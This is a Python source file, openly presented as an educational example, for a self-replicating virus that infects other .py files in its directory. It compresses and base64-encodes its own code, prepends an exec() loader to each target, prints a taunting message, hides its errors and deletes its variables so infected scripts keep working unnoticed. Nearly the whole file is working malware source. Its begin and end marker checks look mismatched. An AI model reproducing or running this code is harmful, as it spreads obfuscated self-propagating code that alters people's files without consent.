#!/usr/bin/env python3

"""The obfuscated version of the virus implementation in Python.

In practice we wouldn't do it using an interpreted language such as Python,
Instead you would use C or Assembly. But this is to provide an example.
The idea is to find files, copy the virus code in an obfuscated version in them, 
the virus code itself has the functions to infect other files.

Reference: https://thepythoncorner.com/posts/2021-08-30-how-to-create-virus-python/
"""

# begin-f8d2cc1bc7178fb48d630fbfe12b0029

import os
import zlib
import glob
import base64
import random
import inspect
import hashlib


def find_files_to_infect(directory="."):
    files = [file for file in glob.glob("*.py")]

    return files

def get_content_of_file(file):
    data = None
    with open(file, "r") as f:
        data = f.readlines()

    return data

def get_content_if_infectable(file, hash):
    data = get_content_of_file(file)

    for line in data:
        # if it's already infected, the job is done!
        if hash in line:
            return None

    return data

def obscure(data):
    # obscure a stream of bytes compressing it and encoding it in base64
    obscured_data = base64.urlsafe_b64encode(zlib.compress(data, 9))

    return obscured_data

def transform_and_obscure_virus_code(virus_code):
    """Transform and obscure the source code of virus.

    Add some random non-executable content, compress it and encode it in base64.

    Parameters:
        virus_code (str): The non-obscured source code of virus.

    Returns:
        obscured_virus_code (str): Transformed, compressed, and base64 encoded version of virus code.
    """
    new_virus_code = []
    for line in virus_code:
        new_virus_code.append("# " + str(random.randrange(1000000)) + "\n")
        new_virus_code.append(line + "\n")

    obscured_virus_code = obscure(bytes("".join(new_virus_code), "utf-8"))

    return obscured_virus_code

def infect(file, virus_code):
    thehash = hashlib.md5(file.encode("utf-8")).hexdigest()

    # := is the new walrus operator
    # https://stackoverflow.com/questions/26000198/what-does-colon-equal-in-python-mean
    if(data := get_content_if_infectable(file, thehash)):
        obscured_virus_code = transform_and_obscure_virus_code(virus_code)
        viral_vector = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(obscured_virus_code)+")))\")"

        with open(file, "w") as f:
            f.write("\n# begin-" + thehash + "\n" + viral_vector + "\n# end-" + thehash + "\n")
            # writelines is used to write a list of strings
            f.writelines(data)

def get_virus_code():
    """Get the virus code from current file.

    This function reads the lines between the `# begin virus` and `# end virus`
    pragmas and returns the lines.

    Returns:
        virus_code (List(str)): List of lines of virus code.
    """
    virus_code_on = False
    virus_code = []

    virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
    code = get_content_of_file(__file__)

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-"+virus_hash in line :
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line + "\n")

        if "# end virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def payload():
    print("This file has been infected! You will not have a good day!")


# entry point
try:
    virus_code = get_virus_code()

    for file in find_files_to_infect():
        infect(file, virus_code)

    payload()

except:
    pass

finally:
    # delete used names from memory, to make sure the virus code 
    # doesn't affect the functionality of the non-infected script
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i

# end-f8d2cc1bc7178fb48d630fbfe12b0029
